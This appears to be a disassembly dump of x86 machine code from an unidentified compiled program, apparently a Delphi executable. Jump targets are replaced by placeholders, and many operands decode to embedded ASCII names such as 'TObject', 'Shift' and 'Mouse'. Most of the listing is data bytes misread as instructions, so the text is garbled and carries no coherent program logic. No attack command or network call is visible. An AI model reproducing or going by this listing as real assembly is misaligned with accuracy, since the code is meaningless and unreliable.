add [ ebx + 0x4509ecc0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
add [ esi + eax + 0x5f6c0045 ] dl
inc ecx
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
lea eax [ eax ]
je r-xdata
add [ eax + eax ] dl
inc ebp
outsd
insb
jae r-xdata
popad
js r-xdata
jb r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
inc ebp
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
imul ebp [ esi + 0x64 ] 0x1
add [ ebx ] al
add [ eax ] al
add ah al
add eax ecx
pop es
inc ebp
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
outsb
mov eax eax
mov esp 0x4004507
add eax 0x74614454
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax + 0x6c004010 ] al
pop edi
inc ecx
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
inc ebp
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
add [ eax ] cl
add [ eax ] al
push eax
inc esi
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ eax ] ah
or [ ebp ] al
or [ eax ] al
add bh bh
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
mov eax 0x7004508
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
dec esp
popad
arpl [ eax + 0x6f ] bp
jb r-xdata
add ecx [ ebx ]
push esp
inc ecx
outsb
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ ecx + edx + 0x40 ] dh
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
add [ eax + r-xdata ] dl
adc [ eax ] 0x40
add [ edi + ebx * 2 + 0x41 ] ch
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x45082074
imul esp [ gs : edi + 0x68 ] 0x45082074
add [ eax + eax ] cl
add bh bh
add [ ecx ] al
add [ eax ] al
add ah dl
push es
inc ebp
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc ebp
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
inc eax
add [ eax + 0x7 ] ah
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
je r-xdata
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
or [ esi ] cl
push esp
inc esp
jb r-xdata
add [ eax + r-xdata ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] dl
pop es
inc eax
inc esp
jb r-xdata
jbe r-xdata
push esp
dec ebx
jns r-xdata
inc ebp
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
push esp
adc [ eax ] al
lea eax [ eax ]
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc ebp
add [ eax ] al
adc [ eax ] al
nop
pushad
or eax [ ebp ]
push esp
adc [ eax ] al
push esp
adc [ eax ] al
adc [ edi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
je r-xdata
jb r-xdata
add [ eax + 0x8004501 ] dh
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
push eax
or al [ ebp ]
or [ ecx ] cl
push esp
dec ebx
jns r-xdata
inc eax
add [ edi + ebx * 2 + 0x41 ] ch
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0xa500040 ] cl
inc ebp
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
inc eax
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
push esp
adc [ eax ] al
push esp
adc [ eax ] al
or al 0x45
or al 0x45
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x74 ] si
adc [ eax ] eax
mov al 0x1
inc ebp
add [ eax ] cl
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
or [ esi ] cl
jbe r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx + 0x40 ] dh
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
fmul [ edx ]
inc ebp
add [ eax ] cl
push cs
push esp
inc ebx
push 0x74007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp + 0xad80040 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
je r-xdata
je r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
outsb
je r-xdata
je r-xdata
je r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
int3
inc eax
add [ eax + 0x4 ] dl
inc ebp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0xccc0040 ] cl
inc ebp
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc eax
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ esp + ecx + 0x45 ] ah
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebx
add ecx [ eax ]
push es
inc eax
ror [ ebx ] 0x45
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
inc eax
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ ebp + 0xbc00040 ] cl
inc ebp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
popad
outsb
add [ ecx + edx + 0x40 ] dh
jb r-xdata
jbe r-xdata
inc ebp
popad
outsb
je r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
je r-xdata
outsb
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc ebx
jpe r-xdata
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
mov ah 0x13
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
mov al [ 0x800450e ]
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
add [ eax ] al
adc [ eax ] al
nop
pop esp
or eax 0xc080045
push esp
add [ eax + 0x4 ] dl
inc ebp
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] dl
pop es
inc ebp
inc eax
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
inc eax
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x74 ] si
adc [ eax ] eax
push eax
add al 0x45
add [ esi + ecx ] dl
inc ebp
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x451028c0 ] cl
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ ebx + edx + 0x45 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x450ea0c0 ] cl
add [ eax ] cl
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx + 0x40 ] dh
add [ ebx + edx + 0x1b8c0045 ] dh
inc ebp
add [ eax ] al
adc [ eax ] al
enter 0x450d 0x0
or [ edi ] cl
push esp
push ebx
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
sub [ eax ] dl
inc ebp
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
push esp
adc [ eax ] al
mov eax eax
mov al [ 0x800450f ]
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ah
adc [ ebp ] eax
stosb [ edi ]
adc eax [ ebp ]
pop esp
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
je r-xdata
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
fdivr [ ebp + eax * 2 ]
add al 0x7d
inc ebp
add [ eax + ebx * 2 ] bl
add [ edi + ecx * 2 ] bl
inc ebp
add [ eax + 0x3400454e ] cl
pop eax
inc ebp
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ eax ] al
insb
je r-xdata
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
add [ ebx + 0x450fa0c0 ] cl
add [ eax ] cl
inc eax
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ ebx ] cl
add [ edx ] eax
mov eax [ 0x7020400 ]
add al [ ebx ]
add al [ esi ]
add cl [ ecx ]
add al [ eax ]
add al [ edx ]
add al [ 0xa020802 ]
add bl [ edi ]
add [ edi ] al
or esi [ eax - 0x4ff14ff4 ]
or eax 0x35b008b0
mov al 0x9
mov al 0x23
mov al 0x30
mov al 0xa
mov al 0x13
mov al 0x14
mov al 0x1c
mov al 0x3a
mov al 0x3c
mov al 0x3d
mov al 0x43
mov al 0x7b
add bh ch
add [ eax ] al
in al 0x10
inc eax
add [ ecx + eax ] dl
inc ebp
add [ esi + ecx * 2 + 0x45 ] dl
add [ eax + 0x20004559 ] ch
pop ecx
inc ebp
add [ esp + ebx * 2 ] dh
inc ebp
add al ah
pop edx
inc ebp
add ah cl
insb
inc ebp
add [ eax + 0x2000457d ] cl
pop edi
inc ebp
add [ edi + ebx * 2 + 0x50080045 ] dl
inc ebp
add [ edi + ebx * 2 + 0x45 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add [ eax ] 0x0
add ah ah
adc [ eax ] al
push esp
add [ eax ] eax
add [ edi * 2 + 0x581c0045 ] al
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ ebx + ecx * 2 + 0x45 ] cl
add al dl
imul eax [ ebp ] sub_4569cc
pushfd
push 0x45
add [ eax - 0x2bffbab3 ] dl
push esp
inc ebp
add [ eax ] bh
push esp
inc ebp
add [ eax + 0x5d ] ah
inc ebp
add al bl
dec esp
inc ebp
add ah bl
dec esp
inc ebp
add al bl
jl r-xdata
pop esp
pop ss
inc edx
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ eax + 0x6e ] ah
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
jo r-xdata
add [ esp + esi * 2 + 0x41 ] ch
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ edi + ebx * 2 + 0x41 ] ch
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
adc [ edi ] cl
inc ebp
add [ eax ] cl
lea eax [ eax ]
inc eax
adc [ ebp ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
jbe r-xdata
add [ eax ] eax
add [ edx + 0x5c004513 ] ch
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ edi + ebx * 2 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
pushfd
adc [ ebp ] al
or [ edx ] dl
push esp
inc ebx
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
add [ esp + ecx * 2 ] ah
inc ebp
add [ eax + 0x7b ] al
inc ebp
add [ eax ] bh
outsd
inc ebp
add al bl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_4513ff
push ecx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54030003 ] al
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
dec eax
add [ eax ] al
dec [ eax ]
push edx
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050004 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
dec esp
add [ eax ] al
[ edx + edx * 2 ]
push [ ebx + edx * 2 + 0x7aa80045 ]
inc ebp
add [ eax ] al
jae r-xdata
xor al 0x40
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
add bh bh
mov ah 0x53
inc ebp
add [ eax + 0x457a ] ch
jb r-xdata
add [ esp + edx * 2 ] ecx
or [ ecx + 0x6d ] ch
push ebx
inc ecx
insb
jo r-xdata
inc esi
add [ eax ] dl
dec ecx
inc ebp
add [ ebx + ebx + 0x1be80042 ] dl
inc edx
add [ eax + ecx * 2 + 0x1ee00045 ] bl
js r-xdata
add [ eax ] al
push es
add [ esi ] al
inc ebx
jne r-xdata
add bh bh
pop eax
pop esp
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
adc [ eax ] al
add [ eax ] 0x0
inc [ eax - 0x77010000 ]
jpe r-xdata
insb
inc ebp
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
jb r-xdata
je r-xdata
popad
pop es
imul ebp [ ebp + 0x41 ] 0x6168706c
push es
imul ebp [ ebp + 0x48 ] 0x7617269
imul ebp [ ebp + 0x53 ] 0x6174614b
push es
imul ebp [ ebp + 0x4b ] 0x9617461
imul ebp [ ebp + 0x43 ] 0x656e6968
jae r-xdata
add [ eax ] cl
pop ds
inc esi
add [ eax + eax * 4 + 0x45 ] ah
add [ eax + 0x4400454a ] cl
dec ecx
inc ebp
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ ecx + ecx * 2 + 0x45 ] bh
add [ edi + ebx + 0x49d80046 ] dl
inc ebp
add [ edi + ebx + 0x49f80046 ] bl
inc ebp
add [ edi + ebx - 0x7f93ffba ] ah
inc ebp
add ah ch
dec edx
inc ebp
add [ ebx + ecx * 2 ] ch
inc ebp
add [ eax ] bl
dec edx
inc ebp
add [ eax - 0x43ffb9e1 ] bh
pop ds
inc esi
add [ edx + ecx * 2 ] bh
inc ebp
add [ edi + eax * 2 + 0x54150045 ] ch
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x15e8c08b
inc ebp
add [ ebx ] al
or [ ecx + ecx * 2 + 0x6d ] dl
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] cl
add [ eax ] al
add ah ah
adc eax 0x69090045
insd
inc esp
imul esi [ ebx + 0x61 ] 0x7656c62
adc [ ecx + 0x45 ] cl
push eax
adc eax 0x45
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
add [ eax - 0x80000000 ] al
or [ eax ] eax
or ecx [ eax + 0x65 ]
insb
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
imul ebp [ esi + 0x74 ] r-xdata
push eax
add [ eax ] eax
call [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or [ eax ] al
or [ eax + 0x65 ] cl
insb
jo r-xdata
pop es
bound esp [ ebp + 0x54 ]
outsd
jo r-xdata
push ss
inc ebp
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x5
add bh bh
add [ eax ] al
add al ch
push ss
inc ebp
add [ esi ] al
bound esp [ ebp + 0x4c ]
je r-xdata
add eax 0x0
push ss
inc ebp
add [ esi ] al
bound esi [ esi + 0x4e ]
outsd
outsb
or [ gs : edx + 0x76 ] esp
or ch [ ecx + 0x6d ]
push ebx
dec eax
popad
outsb
jne r-xdata
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add [ eax - 0x80 ] al
add ah cl
adc eax 0x240045
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jns r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x105
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc edx
outsd
je r-xdata
or [ edx + 0x65 ] ah
bound esp [ ebp + 0x52 ]
imul esp [ edi + 0x68 ] 0x65620874
add [ ebx ] al
add [ eax ] al
add [ edi + edx + 0x45 ] al
add [ esi ] al
jb r-xdata
dec esp
outsd
ja r-xdata
or [ edx + 0x76 ] esp
insb
or [ ecx + 0x6d ] ebp
dec eax
popad
outsb
jne r-xdata
inc ebp
add [ ebx + ebx + 0x42 ] bh
add [ eax - 0x4fffbab7 ] dh
sbb eax [ edx ]
pop esp
dec edx
inc ebp
add [ eax ] al
sbb eax [ edx ]
xchg esp eax
sbb eax [ edx ]
call 0xffffffff9c45578c
dec eax
inc ebp
add al ah
push ds
outsd
jb r-xdata
add [ eax ] al
mov eax 0x34004505
xor al 0x40
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
add [ eax + eax ] ah
jo r-xdata
in al 0x10
inc eax
add [ ecx + eax ] dl
dec eax
push ebx
inc ebp
add [ eax + 0x457a ] ch
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480b0009 ] al
insb
add bh bh
add [ eax ] al
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
bound ebp [ ebx + 0x46 ]
insb
popad
je r-xdata
add [ eax ] al
insb
inc ebp
jae r-xdata
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
or [ fs : edx + 0x76 ] ah
push edx
popad
imul esi [ ebx + 0x65 ] 0x76620764
push ebx
jo r-xdata
or [ edx + 0x76 ] ah
insb
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc eax
test [ edi + 0x41 ] bl
add [ eax + 0x1 ] bl
add [ esi ] al
bound ebp [ ebx + 0x4e ]
outsd
outsb
push es
bound ebp [ ebx + 0x54 ]
imul ebp [ ebp + 0x6 ] 0x6f536b62
je r-xdata
inc esp
pop ss
inc ebp
pop ss
inc ebp
sbb [ ebp ] eax
outsd
insb
jae r-xdata
mov eax eax
mov [ edi ] ss
inc ebp
add [ ecx ] al
or edx [ edx + eax * 2 + 0x65 ]
jbe r-xdata
outsb
je r-xdata
inc ebx
outsd
push ss
inc ebp
add [ ebx + 0x451748c0 ] cl
add [ ebx ] al
or dl [ edx + eax * 2 + 0x65 ]
jbe r-xdata
call 0xffffffff8b455c59
ror [ eax + 0x17 ] 0x45
add eax ebp
arpl [ ebp + 0x8 ] sp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
sahf
inc ebp
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x54004581 ] bl
into
inc ebp
add [ eax - 0x27ffba6a ] cl
xchg ebx eax
inc ecx
add [ eax ] cl
jpo r-xdata
inc ebp
add [ edx + eax ] al
add [ eax ] al
hlt
